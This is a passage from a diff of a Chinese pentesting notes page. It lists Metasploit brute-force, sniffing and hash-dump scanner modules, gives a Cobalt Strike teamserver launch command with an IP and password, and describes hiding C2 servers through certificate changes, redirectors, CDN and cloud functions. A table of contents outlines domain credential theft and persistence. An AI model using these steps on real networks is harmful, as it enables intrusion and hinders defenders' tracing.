-<pre><code>ssh登录auxiliary/scanner/ssh/ssh_loginssh公共密钥认证登录auxiliary/scanner/ssh/ssh_login_pubkey扫描ssh版本测试auxiliary/scanner/ssh/ssh_version
-</code></pre>
-<p>telnet扫描</p>
-<pre><code>telnet登录auxiliary/scanner/telnet/telnet_login扫描telnet版本auxiliary/scanner/telnet/telnet_version
-</code></pre>
-<p>tftp扫描</p>
-<pre><code>扫描tftp的文件auxiliary/scanner/tftp/tftpbruteftp版本扫描scanner/ftp/anonymousARP扫描auxiliary/scanner/discovery/arp_sweep
-</code></pre>
-<p>其他</p>
-<pre><code>扫描UDP服务的主机auxiliary/scanner/discovery/udp_probe
-检测常用的UDP服务auxiliary/scanner/discovery/udp_sweepsniffer
-密码auxiliary/sniffer/psnufflesnmp
-扫描scanner/snmp/communityvnc
-扫描无认证扫描scanner/vnc/vnc_none_auth
+<pre><code>auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口
+auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口
+auxiliary/scanner/telnet/telnet_version  #发现内网telnet服务，基于默认23端口
+auxiliary/scanner/dns/dns_amp            #发现dns服务，基于默认53端口
+auxiliary/scanner/http/http_version      #发现内网http服务，基于默认80端口
+auxiliary/scanner/http/title             #探测内网http服务的标题
+auxiliary/scanner/smb/smb_version        #发现内网smb服务，基于默认的445端口   
+use auxiliary/scanner/mssql/mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口
+use auxiliary/scanner/oracle/oracle_hashdump  #发现内网oracle服务,基于默认的1521端口 
+auxiliary/scanner/mysql/mysql_version    #发现内网mysql服务，基于默认3306端口
+auxiliary/scanner/rdp/rdp_scanner        #发现内网RDP服务，基于默认3389端口
+auxiliary/scanner/redis/redis_server     #发现内网Redis服务，基于默认6379端口
+auxiliary/scanner/db2/db2_version        #探测内网的db2服务，基于默认的50000端口
+auxiliary/scanner/netbios/nbname         #探测内网主机的netbios名字
 </code></pre>
 <h2 id="cobalt-strike后渗透">cobalt strike后渗透</h2>
 <p>cobaltstrike插件</p>
 <pre><code>https://github.com/hack2fun/BypassAV 绕过AV
 https://github.com/pandasec888/taowu-cobalt-strike  大集合
 https://github.com/z1un/Z1-AggressorScripts  大集合
-</code></pre>
-<pre><code>参考资料
+参考资料
 cobaltstrike云服务器安装
 https://hackergu.com/cobaltstrike%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E8%A3%85/
 cs永久运行
 https://blog.csdn.net/qq_44657899/article/details/114306472
-
-</code></pre>
-<pre><code>启动团队服务器
+启动团队服务器
 nohup ./teamserver 42.193.186.7 ASDqwe123 &amp;
 </code></pre>
 <p>beacon命令</p>
 <pre><code>执行命令： shell  whoami
 </code></pre>
-<h2 id="empire后渗透">Empire后渗透</h2>
+<h3 id="一些资料">一些资料</h3>
+<p><strong>CobaltStrike上线隐藏|DNS|CDN|云函数</strong></p>
+<p>https://www.ddosi.com/cobaltstrike-hide/#CDNhttps%E4%B8%8A%E7%BA%BF</p>
+<p>cobalt strike特征隐藏|修改默认端口|去除证书特征|混淆配置</p>
+<p>https://www.ddosi.com/cobalt-strike-bypass/</p>
+<p>隐藏源IP|提高溯源难度|隐藏cobalt strike服务器</p>
+<p>https://www.ddosi.com/c2-hidden/#</p>
+<h3 id="cobalt-strike配置隐藏">cobalt strike配置隐藏</h3>
+<pre><code>1.更改默认端口
+vi teamserver
+
+2.去除证书特征
+Cobalt Strike默认的证书已经是分分钟被逮,所以需要生成一个新的证书
+这里可以用keytool这个工具。操作简单。Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/1392192-20210520204927340-497762871.png" alt="img" loading="lazy"></figure>
+<p>更换证书</p>
+<h3 id="cobalt-strike域前置技术">cobalt strike（域前置技术）</h3>
+<h3 id="cobalt-strike隐藏技术尽量不使用ip重定向技术">cobalt strike隐藏技术（尽量不使用IP）重定向技术</h3>
+<pre><code>DNS服务器-&gt;外网服务器-&gt;teamserver服务器-&gt;kali
+
+重定向技术
+DNS服务器：r1.cs.com解析ip为外网服务器
+外网服务器:socat转发
+teamserver服务器：接受数据
+</code></pre>
+<h3 id="cobalt-strike隐藏技术尽量不使用ipcdn技术">cobalt strike隐藏技术（尽量不使用IP）CDN技术</h3>
+<p>godaddy设置</p>
+<pre><code>1.购买域名https://dcc.godaddy.com/
+2.DNS域名服务器设置为cloudflare
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622232348549.png" alt="image-20210622232348549" loading="lazy"></figure>
+<p>cloudflare设置</p>
+<pre><code>1.注册登录账号
+2.添加网站设置CDN
+3.关闭缓存 如下图
+
+Cloudflare有个特点，如果用其他端口的话，是监听不到的
+Cloudflare支持的HTTP端口是：80,8080,8880,2052,2082,2086,2095
+Cloudflare支持的HTTPs端口是：443,2053,2083,2087,2096,8443
+</code></pre>
+<figure data-type="image" tabindex="26"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210622210736110.png" alt="image-20210622210736110" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000719412.png" alt="image-20210623000719412" loading="lazy"></figure>
+<p>cobalt strike设置</p>
+<figure data-type="image" tabindex="28"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210623000644572.png" alt="image-20210623000644572" loading="lazy"></figure>
+<p>自己的参数</p>
+<pre><code>阿里云服务器：safebug.top cdn
+</code></pre>
+<h3 id="cobalt-strike隐藏技术腾讯云函数技术">cobalt strike隐藏技术（腾讯云函数技术）</h3>
+<h3 id="配置禁止ip访问服务器仅允许cdn的ip">配置禁止IP访问服务器仅允许CDN的IP</h3>
+<pre><code>https://www.bnxb.com/nginx/27638.html
+</code></pre>
+<h2 id="安全加固">安全加固</h2>
+<p><a href="https://github.com/0Kee-Team/WatchAD">0Kee-Team/WatchAD: AD Security Intrusion Detection System (github.com)</a></p>
+<p><a href="https://github.com/0Kee-Team/WatchAD/blob/master/README_zh-cn.md">WatchAD/README_zh-cn.md at master · 0Kee-Team/WatchAD (github.com)</a></p>
+<p><a href="https://edu.heibai.org/02%E6%9C%80%E5%90%8E%E7%9A%84%E9%98%B2%E7%BA%BF%EF%BC%81%E9%AB%98%E7%BA%A7%E5%9F%9F%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E6%A3%80%E6%B5%8B(1).pdf">PowerPoint 演示文稿 (heibai.org)</a></p>
 
               </div>
               <div class="toc-container">
                 <ul class="markdownIt-TOC">
-<li>
+<li><a href="#%E5%9F%9F%E6%B8%97%E9%80%8F">域渗透</a>
 <ul>
 <li><a href="#%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D">基本介绍</a>
 <ul>
-<li><a href="#%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84">基本架构</a></li>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84%E5%9B%BE%E8%A7%A3">基本架构（图解）</a></li>
 <li><a href="#kerberos%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E5%9B%BE%E8%A7%A3">Kerberos协议原理（图解）</a></li>
+<li><a href="#ntlm%E8%AE%A4%E8%AF%81%E5%9B%BE%E8%A7%A3">NTLM认证（图解）</a></li>
 </ul>
 </li>
 <li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
 <ul>
-<li><a href="#github%E9%A1%B9%E7%9B%AE">Github项目</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B1-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF">案例1-基本信息</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B2-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF">案例2-网络信息</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B3-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">案例3-用户信息</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B4-%E5%87%AD%E6%8D%AE%E4%BF%A1%E6%81%AF">案例4-凭据信息</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B5-%E5%9F%9F%E5%86%85%E7%8E%AF%E5%A2%83">案例5-域内环境</a></li>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF">基本信息</a></li>
+<li><a href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF">网络信息</a></li>
+<li><a href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">用户信息</a></li>
+<li><a href="#%E5%87%AD%E6%8D%AE%E4%BF%A1%E6%81%AF">凭据信息</a></li>
+<li><a href="#%E5%9F%9F%E5%86%85%E7%8E%AF%E5%A2%83">域内环境</a></li>
+</ul>
+</li>
+<li><a href="#%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96">凭证获取</a>
+<ul>
+<li><a href="#rdp%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96">RDP密码抓取</a></li>
+<li><a href="#%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96">内存密码抓取</a>
+<ul>
+<li><a href="#mimikatz%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%8F%96">mimikatz直接获取</a></li>
+<li><a href="#procdumpmimikatz%E9%85%8D%E5%90%88">Procdump+Mimikatz配合</a></li>
+</ul>
+</li>
+<li><a href="#sam%E6%96%87%E4%BB%B6hash%E5%80%BC%E8%8E%B7%E5%8F%96">sam文件hash值获取</a></li>
+<li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3ntlm-hash">暴力破解NTLM Hash</a></li>
+<li><a href="#%E5%9F%9F%E7%94%A8%E6%88%B7hash%E8%8E%B7%E5%8F%96dsync">域用户HASH获取（dsync）</a></li>
 </ul>
 </li>
 <li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a>
 <ul>
-<li><a href="#github%E9%A1%B9%E7%9B%AE-2">GIthub项目</a></li>
-<li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">注意事项</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B1-ipc%E5%9F%9F%E5%85%B1%E4%BA%AB%E7%AE%A1%E9%81%93">案例1-IPC（域共享管道）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B2-%E6%98%8E%E6%96%87hash%E4%BC%A0%E9%80%92atexec-impacket">案例2-明文HASH传递atexec-impacket</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B5-procdumpmimikatz%E9%85%8D%E5%90%88%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96">案例5-Procdump+Mimikatz配合（凭证获取）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B6-hashcat%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3ntlm-hash">案例6-Hashcat暴力破解NTLM Hash</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B7-smb%E6%9C%8D%E5%8A%A1%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92">案例7-SMB服务明文或hash传递</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B8-wmi%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8-cscriptwmiexecwmic">案例8-WMI服务利用-cscript,wmiexec,wmic</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B9-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8pth-ntml%E4%BC%A0%E9%80%92">案例9-横向移动PTH NTML传递</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B10-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8ptk-ntml%E4%BC%A0%E9%80%92">案例10-横向移动PTK NTML传递</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B11-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8ptt%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92-ms14068kekeo%E6%9C%AC%E5%9C%B0">案例11-横向移动PTT哈希票据传递-ms14068&amp;kekeo&amp;本地</a>
+<li><a href="#%E6%A8%A1%E6%8B%9F%E5%9F%9F%E6%8E%A7">模拟域控</a>
 <ul>
-<li><a href="#ms14-068">MS14-068</a></li>
-<li><a href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7kekeo">利用工具kekeo</a></li>
+<li><a href="#ipc%E5%9F%9F%E5%85%B1%E4%BA%AB%E7%AE%A1%E9%81%93">IPC（域共享管道）</a></li>
+<li><a href="#rdp%E5%8D%8F%E8%AE%AE%E4%BC%A0%E9%80%92">RDP协议传递</a></li>
+<li><a href="#psexec%E5%BE%AE%E8%BD%AF%E5%B7%A5%E5%85%B7">Psexec（微软工具）</a></li>
+<li><a href="#wmiexec">wmiexec</a></li>
+<li><a href="#smbexec">smbexec</a></li>
+<li><a href="#winrm">winrm</a></li>
+<li><a href="#atexec">atexec</a></li>
+<li><a href="#%E5%93%88%E5%B8%8C%E6%94%BB%E5%87%BB">哈希攻击</a>
+<ul>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8pth-ntml%E4%BC%A0%E9%80%92">横向移动PTH NTML传递</a></li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8ptk-ntml%E4%BC%A0%E9%80%92">横向移动PTK NTML传递</a></li>
+<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8ptt%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92">横向移动PTT哈希票据传递</a></li>
 </ul>
 </li>
-<li><a href="#%E4%BC%AA%E9%80%A0%E6%9C%AC%E5%9C%B0%E7%A5%A8%E6%8D%AEptt">伪造本地票据（PTT）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B12-rdp%E5%8D%8F%E8%AE%AE%E4%BC%A0%E9%80%92">案例12-RDP协议传递</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B13-kerberoast%E6%94%BB%E5%87%BBspn%E6%89%AB%E6%8F%8F">案例13-Kerberoast攻击(SPN扫描)</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B14-sam%E6%96%87%E4%BB%B6hash%E5%80%BC%E8%8E%B7%E5%8F%96">案例14-sam文件hash值获取</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E7%8B%AC%E7%89%B9%E7%9A%84%E6%94%BB%E5%87%BB">域渗透独特的攻击</a>
+<ul>
+<li><a href="#%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E9%87%8D%E7%82%B9">委派攻击(重点)</a>
+<ul>
+<li><a href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB">非约束委派攻击</a></li>
+<li><a href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB">约束委派攻击</a></li>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB">基于资源的委派攻击</a></li>
+</ul>
+</li>
+<li><a href="#kerberoast%E6%94%BB%E5%87%BBspn%E6%89%AB%E6%8F%8F">Kerberoast攻击(SPN扫描)</a></li>
+<li><a href="#ntlm-relay">NTLM Relay</a></li>
+<li><a href="#as-rep-rosating%E6%94%BB%E5%87%BB">AS-REP Rosating攻击</a></li>
+</ul>
+</li>
+<li><a href="#dcshadow">DCshadow</a></li>
+<li><a href="#cve%E5%B8%B8%E7%94%A8%E6%BC%8F%E6%B4%9E">CVE常用漏洞</a>
+<ul>
+<li><a href="#cve-2014-6324">CVE-2014-6324</a></li>
+<li><a href="#cve-2019-1040">CVE-2019-1040</a></li>
+<li><a href="#cve-2019-0708">CVE-2019-0708</a></li>
+<li><a href="#cve-2020-1472%E5%B8%B8%E7%94%A8">CVE-2020-1472（常用）</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="#%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF">代理技术</a>
 <ul>
-<li><a href="#%E6%A1%88%E4%BE%8B1-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8Fngrok%E6%B5%8B%E8%AF%95%E6%BC%94%E7%A4%BA-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF">案例1-内网穿透Ngrok测试演示-两个内网通讯上线</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B2-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8Ffrp%E8%87%AA%E5%BB%BA%E8%B7%B3%E6%9D%BF%E6%B5%8B%E8%AF%95-%E4%B8%A4%E4%B8%AA%E5%86%85%E7%BD%91%E9%80%9A%E8%AE%AF%E4%B8%8A%E7%BA%BF">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B3-socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AFew%E5%B7%A5%E5%85%B7">案例3-Socks代理技术（ew工具）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B4-socks%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AFgofrp%E5%B7%A5%E5%85%B7">案例4-socks反向代理技术（gofrp工具）</a></li>
+<li><a href="#ngrok">Ngrok</a></li>
+<li><a href="#gofrp">gofrp</a></li>
+<li><a href="#socks%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AFew%E5%B7%A5%E5%85%B7">Socks代理技术（ew工具）</a></li>
+<li><a href="#socks%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AFgofrp%E5%B7%A5%E5%85%B7">socks反向代理技术（gofrp工具）</a></li>
+<li><a href="#meterpreter">meterpreter</a></li>
+<li><a href="#%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E6%8A%80%E6%9C%AF">路由转发技术</a></li>
 </ul>
 </li>
 <li><a href="#%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">隧道技术</a>
 <ul>
-<li><a href="#%E6%A1%88%E4%BE%8B1-%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%BA%94%E7%94%A8%E5%B1%82%E6%A3%80%E6%B5%8B%E8%BF%9E%E9%80%9A%E6%80%A7-%E6%A3%80%E6%B5%8B">案例1-网络传输应用层检测连通性-检测</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B2-%E7%BD%91%E7%BB%9C%E5%B1%82icmp%E9%9A%A7%E9%81%93ptunnel%E4%BD%BF%E7%94%A8%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">案例2-网络层ICMP隧道ptunnel使用(隧道技术)</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B3-%E4%BC%A0%E8%BE%93%E5%B1%82%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93portmap%E4%BD%BF%E7%94%A8">案例3-传输层转发隧道Portmap使用</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B4-%E5%BA%94%E7%94%A8%E5%B1%82dns%E9%9A%A7%E9%81%93%E9%85%8D%E5%90%88cs%E4%B8%8A%E7%BA%BF">案例4-应用层DNS隧道配合CS上线</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B5-cs%E7%9A%84shell-msf%E7%9A%84shell">案例5-CS的SHELL-&gt;MSF的SHELL</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B6-ssh%E9%9A%A7%E9%81%93%E5%8A%A8%E6%80%81%E9%9D%99%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">案例6-SSH隧道（动态/静态端口转发）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B7-dns%E9%9A%A7%E9%81%93%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">案例7-DNS隧道（隧道技术）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B8-socks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">案例8-socks代理（隧道技术）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B9-httphttps%E5%8D%8F%E8%AE%AE%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF">案例9-HTTP/HTTPS协议（隧道技术）</a></li>
-<li><a href="#%E6%A1%88%E4%BE%8B10-https%E9%9A%A7%E9%81%93cscdnhttps">案例10-HTTPS隧道（CS+CDN+HTTPS）</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%BF%9E%E9%80%9A%E6%80%A7">检测连通性</a></li>
+<li><a href="#icmp%E9%9A%A7%E9%81%93">ICMP隧道</a></li>
+<li><a href="#dns%E9%9A%A7%E9%81%93">DNS隧道</a>
+<ul>
+<li><a href="#%E5%BA%94%E7%94%A8%E5%B1%82dns%E9%9A%A7%E9%81%93%E9%85%8D%E5%90%88cs%E4%B8%8A%E7%BA%BF">应用层DNS隧道配合CS上线</a></li>
 </ul>
 </li>
-<li><a href="#%E8%BD%AC%E5%8F%91%E8%B7%AF%E7%94%B1">转发/路由</a>
-<ul>
-<li><a href="#meterpreter">meterpreter</a></li>
-<li><a href="#%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF">路由技术</a></li>
+<li><a href="#ssh%E9%9A%A7%E9%81%93">SSH隧道</a></li>
+<li><a href="#httphttps%E5%8D%8F%E8%AE%AEsocks%E9%9A%A7%E9%81%93">HTTP/HTTPS协议（socks隧道）</a></li>
+<li><a href="#https%E9%9A%A7%E9%81%93cscdnhttps">HTTPS隧道（CS+CDN+HTTPS）</a></li>
 </ul>
 </li>
 <li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a>
 <ul>
-<li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%A5%A8%E6%8D%AE%E6%8A%80%E6%9C%AF">白银票据（票据技术）</a></li>
-<li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%A5%A8%E6%8D%AE%E6%8A%80%E6%9C%AF">黄金票据（票据技术）</a></li>
+<li><a href="#%E7%A5%A8%E6%8D%AE%E6%8A%80%E6%9C%AF">票据技术</a>
+<ul>
+<li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE">白银票据</a></li>
+<li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE">黄金票据</a></li>
 </ul>
 </li>
-<li><a href="#%E9%92%93%E9%B1%BC%E6%8A%80%E6%9C%AF">钓鱼技术</a></li>
-<li><a href="#%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1">保护自己</a>
+<li><a href="#%E5%A7%94%E6%B4%BE%E7%BB%B4%E6%8C%81">委派维持</a></li>
+<li><a href="#sid-history%E5%9F%9F%E5%90%8E%E9%97%A8">SID History域后门</a></li>
+<li><a href="#skeleton-key%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81">Skeleton Key(万能密码)</a></li>
+<li><a href="#dsrm%E5%90%8E%E9%97%A8">DSRM后门</a></li>
+</ul>
+</li>
+<li><a href="#msf%E5%90%8E%E6%B8%97%E9%80%8F">MSF后渗透</a>
+<ul>
+<li><a href="#meterperter%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">meterperter基本系统命令</a></li>
+<li><a href="#msf%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97">MSF后渗透模块</a></li>
+</ul>
+</li>
+<li><a href="#cobalt-strike%E5%90%8E%E6%B8%97%E9%80%8F">cobalt strike后渗透</a>
 <ul>
 <li><a href="#%E4%B8%80%E4%BA%9B%E8%B5%84%E6%96%99">一些资料</a></li>
 <li><a href="#cobalt-strike%E9%85%8D%E7%BD%AE%E9%9A%90%E8%97%8F">cobalt strike配置隐藏</a></li>
@@ -1229,14 +1286,7 @@ nohup ./teamserver 42.193.186.7 ASDqwe123 &amp;
 <li><a href="#%E9%85%8D%E7%BD%AE%E7%A6%81%E6%AD%A2ip%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%85%E5%85%81%E8%AE%B8cdn%E7%9A%84ip">配置禁止IP访问服务器仅允许CDN的IP</a></li>
 </ul>
 </li>
-<li><a href="#msf%E5%90%8E%E6%B8%97%E9%80%8F">MSF后渗透</a>
-<ul>
-<li><a href="#meterperter%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4">meterperter基本系统命令</a></li>
-<li><a href="#msf%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97">MSF后渗透模块</a></li>
-</ul>
-</li>
-<li><a href="#cobalt-strike%E5%90%8E%E6%B8%97%E9%80%8F">cobalt strike后渗透</a></li>
-<li><a href="#empire%E5%90%8E%E6%B8%97%E9%80%8F">Empire后渗透</a></li>
+<li><a href="#%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA">安全加固</a></li>
 </ul>
 </li>
 </ul>
